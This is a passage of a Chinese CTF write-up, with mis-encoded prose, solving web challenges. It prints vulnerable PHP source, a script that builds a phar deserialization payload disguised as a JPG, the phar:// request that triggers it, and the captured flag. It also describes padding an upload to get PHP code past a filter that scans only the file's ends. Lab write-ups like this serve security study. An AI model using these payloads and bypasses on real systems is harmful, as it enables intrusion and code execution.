&#123;</span><br><span class="line">                $error = &quot;Failed to read file or file does not exist: &quot; . htmlspecialchars($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $content = $file_contents;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $error = null;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Reader&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        :root&#123;</span><br><span class="line">            --card-bg: #ffffff;</span><br><span class="line">            --page-bg: linear-gradient(135deg,#f0f7ff 0%,#fbfbfb 100%);</span><br><span class="line">            --accent: #1e88e5;</span><br><span class="line">            --muted: #6b7280;</span><br><span class="line">            --success: #16a34a;</span><br><span class="line">            --danger: #dc2626;</span><br><span class="line">            --card-radius: 12px;</span><br><span class="line">            --card-pad: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        html,body&#123;height:100%;margin:0;font-family: Inter, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial;&#125;</span><br><span class="line">        body&#123;</span><br><span class="line">            background: var(--page-bg);</span><br><span class="line">            display:flex;</span><br><span class="line">            align-items:center;</span><br><span class="line">            justify-content:center;</span><br><span class="line">            padding:24px;</span><br><span class="line">        &#125;</span><br><span class="line">        .card&#123;</span><br><span class="line">            width:100%;</span><br><span class="line">            max-width:820px;</span><br><span class="line">            background:var(--card-bg);</span><br><span class="line">            border-radius:var(--card-radius);</span><br><span class="line">            box-shadow: 0 10px 30px rgba(16,24,40,0.08);</span><br><span class="line">            padding:var(--card-pad);</span><br><span class="line">        &#125;</span><br><span class="line">        h1&#123;margin:0 0 6px 0;font-size:18px;color:#0f172a;&#125;</span><br><span class="line">        p.lead&#123;margin:0 0 18px 0;color:var(--muted);font-size:13px&#125;</span><br><span class="line">        form.controls&#123;display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:14px&#125;</span><br><span class="line">        input[type=&quot;text&quot;]&#123;</span><br><span class="line">            flex:1;</span><br><span class="line">            padding:10px 12px;</span><br><span class="line">            border:1px solid #e6e9ef;</span><br><span class="line">            border-radius:8px;</span><br><span class="line">            font-size:14px;</span><br><span class="line">            outline:none;</span><br><span class="line">            transition:box-shadow .12s ease,border-color .12s ease;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=&quot;text&quot;]:focus&#123;box-shadow:0 0 0 4px rgba(30,136,229,0.08);border-color:var(--accent)&#125;</span><br><span class="line">        button.btn&#123;</span><br><span class="line">            padding:10px 16px;</span><br><span class="line">            background:var(--accent);</span><br><span class="line">            color:white;</span><br><span class="line">            border:none;</span><br><span class="line">            border-radius:8px;</span><br><span class="line">            cursor:pointer;</span><br><span class="line">            font-weight:600;</span><br><span class="line">        &#125;</span><br><span class="line">        button.btn.secondary&#123;</span><br><span class="line">            background:#f3f4f6;color:#0f172a;font-weight:600;border:1px solid #e6e9ef;</span><br><span class="line">        &#125;</span><br><span class="line">        .hint&#123;font-size:12px;color:var(--muted);margin-top:6px&#125;</span><br><span class="line">        .result&#123;</span><br><span class="line">            margin-top:14px;</span><br><span class="line">            border-radius:8px;</span><br><span class="line">            overflow:hidden;</span><br><span class="line">            border:1px solid #e6e9ef;</span><br><span class="line">        &#125;</span><br><span class="line">        .result .meta&#123;</span><br><span class="line">            padding:10px 12px;</span><br><span class="line">            display:flex;</span><br><span class="line">            justify-content:space-between;</span><br><span class="line">            align-items:center;</span><br><span class="line">            background:#fbfdff;</span><br><span class="line">            font-size:13px;</span><br><span class="line">            color:#111827;</span><br><span class="line">        &#125;</span><br><span class="line">        .result .body&#123;</span><br><span class="line">            padding:12px;</span><br><span class="line">            background:#0b1220;</span><br><span class="line">            color:#e6eef8;</span><br><span class="line">            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, &quot;Roboto Mono&quot;, monospace;</span><br><span class="line">            font-size:13px;</span><br><span class="line">            line-height:1.5;</span><br><span class="line">            max-height:520px;</span><br><span class="line">            overflow:auto;</span><br><span class="line">            white-space:pre-wrap;</span><br><span class="line">            word-break:break-word;</span><br><span class="line">        &#125;</span><br><span class="line">        .alert&#123;padding:10px 12px;border-radius:8px;font-weight:600;margin-top:12px;&#125;</span><br><span class="line">        .alert.warn&#123;background:#fff7ed;color:#92400e;border:1px solid #ffedd5&#125;</span><br><span class="line">        .alert.error&#123;background:#fff1f2;color:#9f1239;border:1px solid #fecaca&#125;</span><br><span class="line">        .alert.info&#123;background:#ecfeff;color:#064e3b;border:1px solid #bbf7d0&#125;</span><br><span class="line">        .footer&#123;margin-top:12px;font-size:12px;color:var(--muted)&#125;</span><br><span class="line">        @media (max-width:640px)&#123;</span><br><span class="line">            .card&#123;padding:16px&#125;</span><br><span class="line">            .result .meta&#123;font-size:12px&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;card&quot;&gt;</span><br><span class="line">    &lt;h1&gt;ğŸ“„ File Reader&lt;/h1&gt;</span><br><span class="line">    &lt;p class=&quot;lead&quot;&gt;åœ¨ä¸‹é¢è¾“å…¥è¦è¯»å–çš„æ–‡ä»¶&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form class=&quot;controls&quot; method=&quot;get&quot; action=&quot;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;filename&quot; value=&quot;&lt;?php echo isset($_GET[&#x27;filename&#x27;]) ? htmlspecialchars($_GET[&#x27;filename&#x27;], ENT_QUOTES) : &#x27;&#x27;; ?&gt;&quot; /&gt;</span><br><span class="line">        &lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;è¯»å–æ–‡ä»¶&lt;/button&gt;</span><br><span class="line">        &lt;a class=&quot;btn secondary&quot; href=&quot;&quot;&gt;é‡ç½®&lt;/a&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;?php if ($error !== null &amp;&amp; $error !== &#x27;&#x27;): ?&gt;</span><br><span class="line">        &lt;div class=&quot;alert error&quot; role=&quot;alert&quot;&gt;&lt;?php echo htmlspecialchars($error, ENT_QUOTES); ?&gt;&lt;/div&gt;</span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line">    &lt;!--RUN printf &quot;open_basedir=/var/www/html:/tmp\nsys_temp_dir=/tmp\nupload_tmp_dir=/tmp\n&quot; \</span><br><span class="line">    &gt; /usr/local/etc/php/conf.d/zz-open_basedir.ini--&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php if ($content !== null): ?&gt;</span><br><span class="line">        &lt;div class=&quot;result&quot; aria-live=&quot;polite&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;meta&quot;&gt;</span><br><span class="line">                &lt;div&gt;æ–‡ä»¶ï¼š&lt;?php echo htmlspecialchars($filename, ENT_QUOTES); ?&gt;&lt;/div&gt;</span><br><span class="line">                &lt;div style=&quot;font-size:12px;color:var(--muted)&quot;&gt;&lt;?php echo strlen($content); ?&gt; bytes&lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;body&quot;&gt;&lt;pre&gt;&lt;?php echo htmlspecialchars($content, ENT_QUOTES); ?&gt;&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;?php elseif ($error === null &amp;&amp; isset($_GET[&#x27;filename&#x27;])): ?&gt;</span><br><span class="line">        &lt;div class=&quot;alert warn&quot;&gt;æœªèƒ½è¯»å–å†…å®¹æˆ–æ–‡ä»¶ä¸ºç©ºã€‚&lt;/div&gt;</span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>è¯» function.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce_me</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rce_me</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Success!\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag/flag.txt &gt; /tmp/flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰«ææœ‰ä¸ªuploads.phpï¼Œè¯»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$uploadDir = __DIR__ . &#x27;/uploads/&#x27;;</span><br><span class="line">if (!is_dir($uploadDir)) &#123;</span><br><span class="line">    mkdir($uploadDir, 0755, true);</span><br><span class="line">&#125;</span><br><span class="line">$whitelist = [&#x27;txt&#x27;, &#x27;log&#x27;, &#x27;jpg&#x27;, &#x27;jpeg&#x27;, &#x27;png&#x27;, &#x27;zip&#x27;,&#x27;gif&#x27;,&#x27;gz&#x27;];</span><br><span class="line">$allowedMimes = [</span><br><span class="line">    &#x27;txt&#x27;  =&gt; [&#x27;text/plain&#x27;],</span><br><span class="line">    &#x27;log&#x27;  =&gt; [&#x27;text/plain&#x27;],</span><br><span class="line">    &#x27;jpg&#x27;  =&gt; [&#x27;image/jpeg&#x27;],</span><br><span class="line">    &#x27;jpeg&#x27; =&gt; [&#x27;image/jpeg&#x27;],</span><br><span class="line">    &#x27;png&#x27;  =&gt; [&#x27;image/png&#x27;],</span><br><span class="line">    &#x27;zip&#x27;  =&gt; [&#x27;application/zip&#x27;, &#x27;application/x-zip-compressed&#x27;, &#x27;multipart/x-zip&#x27;],</span><br><span class="line">    &#x27;gif&#x27;  =&gt; [&#x27;image/gif&#x27;],</span><br><span class="line">    &#x27;gz&#x27;   =&gt; [&#x27;application/gzip&#x27;, &#x27;application/x-gzip&#x27;]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$resultMessage = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; isset($_FILES[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $file = $_FILES[&#x27;file&#x27;];</span><br><span class="line"></span><br><span class="line">    if ($file[&#x27;error&#x27;] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $originalName = $file[&#x27;name&#x27;];</span><br><span class="line">        $ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));</span><br><span class="line">        if (!in_array($ext, $whitelist, true)) &#123;</span><br><span class="line">            die(&#x27;File extension not allowed.&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $mime = $file[&#x27;type&#x27;];</span><br><span class="line">        if (!isset($allowedMimes[$ext]) || !in_array($mime, $allowedMimes[$ext], true)) &#123;</span><br><span class="line">            die(&#x27;MIME type mismatch or not allowed. Detected: &#x27; . htmlspecialchars($mime));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $safeBaseName = preg_replace(&#x27;/[^A-Za-z0-9_\-\.]/&#x27;, &#x27;_&#x27;, basename($originalName));</span><br><span class="line">        $safeBaseName = ltrim($safeBaseName, &#x27;.&#x27;);</span><br><span class="line">        $targetFilename = time() . &#x27;_&#x27; . $safeBaseName;</span><br><span class="line"></span><br><span class="line">        file_put_contents(&#x27;/tmp/log.txt&#x27;, &quot;upload file success: $targetFilename, MIME: $mime\n&quot;);</span><br><span class="line"></span><br><span class="line">        $targetPath = $uploadDir . $targetFilename;</span><br><span class="line">        if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $targetPath)) &#123;</span><br><span class="line">            @chmod($targetPath, 0644);</span><br><span class="line">            $resultMessage = &#x27;&lt;div class=&quot;success&quot;&gt; File uploaded successfully &#x27;. &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $resultMessage = &#x27;&lt;div class=&quot;error&quot;&gt; Failed to move uploaded file.&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $resultMessage = &#x27;&lt;div class=&quot;error&quot;&gt; Upload error: &#x27; . $file[&#x27;error&#x27;] . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Secure File Upload&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: &quot;Segoe UI&quot;, Arial, sans-serif;</span><br><span class="line">            background: linear-gradient(135deg, #e3f2fd, #f8f9fa);</span><br><span class="line">            height: 100vh;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">        &#125;</span><br><span class="line">        .container &#123;</span><br><span class="line">            background: #fff;</span><br><span class="line">            padding: 2em 3em;</span><br><span class="line">            border-radius: 16px;</span><br><span class="line">            box-shadow: 0 8px 24px rgba(0,0,0,0.1);</span><br><span class="line">            max-width: 400px;</span><br><span class="line">            width: 90%;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            color: #0078d7;</span><br><span class="line">            margin-bottom: 0.8em;</span><br><span class="line">            font-size: 1.6em;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=&quot;file&quot;] &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin: 1em auto;</span><br><span class="line">            font-size: 0.95em;</span><br><span class="line">        &#125;</span><br><span class="line">        button &#123;</span><br><span class="line">            background-color: #0078d7;</span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            padding: 0.6em 1.4em;</span><br><span class="line">            border-radius: 6px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            transition: 0.2s ease;</span><br><span class="line">        &#125;</span><br><span class="line">        button:hover &#123;</span><br><span class="line">            background-color: #005ea6;</span><br><span class="line">        &#125;</span><br><span class="line">        .success, .error &#123;</span><br><span class="line">            margin-top: 1em;</span><br><span class="line">            padding: 0.8em;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            font-weight: 600;</span><br><span class="line">        &#125;</span><br><span class="line">        .success &#123;</span><br><span class="line">            background: #e8f5e9;</span><br><span class="line">            color: #2e7d32;</span><br><span class="line">            border: 1px solid #81c784;</span><br><span class="line">        &#125;</span><br><span class="line">        .error &#123;</span><br><span class="line">            background: #ffebee;</span><br><span class="line">            color: #c62828;</span><br><span class="line">            border: 1px solid #ef9a9a;</span><br><span class="line">        &#125;</span><br><span class="line">        .footer &#123;</span><br><span class="line">            margin-top: 1.5em;</span><br><span class="line">            font-size: 0.85em;</span><br><span class="line">            color: #666;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;h1&gt;ğŸ“¤ File Upload Portal&lt;/h1&gt;</span><br><span class="line">    &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; required&gt;</span><br><span class="line">        &lt;button type=&quot;submit&quot;&gt;Upload&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;?= $resultMessage ?&gt;</span><br><span class="line">    &lt;div class=&quot;footer&quot;&gt;Allowed types: txt, log, jpg, jpeg, png, zip&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æ—¥å¿—ï¼š/tmp/log.txt</p><p>æ‰“pharååºåˆ—åŒ–ï¼Œç”Ÿæˆpharæ–‡ä»¶ï¼Œæ”¹ä¸ºjpgåç¼€ä¸Šä¼ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b1</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"><span class="variable">$b1</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;luo = <span class="variable">$b1</span>;</span><br><span class="line"><span class="variable">$b2</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$b2</span>-&gt;test = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b2</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>è¯» /tmp/log.txt å¾—åˆ°æ–°æ–‡ä»¶åï¼Œuploads/1761925409_1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar://./uploads%2F1761925409_1.jpg&amp;serialized=1</span><br></pre></td></tr></table></figure><p>å†è¯»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filename=/tmp/flag</span><br></pre></td></tr></table></figure><p><code>SYC&#123;019a3adcbde67924b65de3fd2c796bfc&#125;</code></p><p>â€‹</p><h3 id="eeeeezzzzzzZip"><a href="#eeeeezzzzzzZip" class="headerlink" title="eeeeezzzzzzZip"></a>eeeeezzzzzzZip</h3><blockquote><p>å°æ­å†™äº†ä¸€ä¸ªå‹ç¼©åŒ…ç®¡ç†å¹³å°ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªå¼€å‘å¾ˆä¸ä»”ç»†ï¼Œä¹Ÿè®¸æœ‰ä»€ä¹ˆé—®é¢˜åœ¨é‡Œé¢å‘¢</p></blockquote><p>æ‰«æä¸‹è½½www.zipï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">login.php â€” ç™»å½•è®¤è¯é¡µé¢ï¼ˆå›ºå®šè´¦å·å¯†ç ï¼‰ã€‚</span><br><span class="line">upload.php â€” å—é™ä¸Šä¼ æ¥å£ï¼Œå…è®¸ä¸Šä¼ å‹ç¼©æ–‡ä»¶ã€‚</span><br><span class="line">index.php â€” ç™»å½•åä¸»é¡µé¢ï¼Œå¯å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œ include æ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><p>login.phpç™»å½•ï¼Œadmin/guest123ã€‚</p><p>upload.phpï¼š</p><p>åªå…è®¸ä¸Šä¼ åç¼€ä¸º .zip/.bz2/.gz/.xz/.7z çš„æ–‡ä»¶ï¼Œå¹¶ä¸” MIME ç±»å‹è¦åŒ¹é…ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜åšäº†å†…å®¹è¿‡æ»¤ï¼Œå‡½æ•° content_filter() ä¼šè¯»å–æ–‡ä»¶çš„å¤´ 4KB + å°¾ 4KBï¼Œå¦‚æœåŒ…å«ä»¥ä¸Šä»»æ„é»‘åå•å…³é”®å­—ï¼Œåˆ™ä¸Šä¼ æ‹’ç»ã€‚</p><p>content_filterå‡½æ•°è¯»å–æ–‡ä»¶å¤´å’Œå°¾å„4096å­—èŠ‚ï¼Œæ£€æŸ¥æ˜¯å¦åŒ…å«BLOCK_LISTä¸­çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ‰¾åˆ°åˆ™è¿”å›falseè¡¨ç¤ºè¢«é˜»å¡ã€‚</p><p>æœªæ£€æŸ¥æ–‡ä»¶ä¸­é—´çš„å†…å®¹ï¼Œä¸Šä¼ æ­£å¸¸gzipæ•°æ®ï¼Œç„¶åå‰åå„å¡4096åƒåœ¾æ•°æ®ï¼Œä¸­é—´æ”¾phpä»£ç å³å¯ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 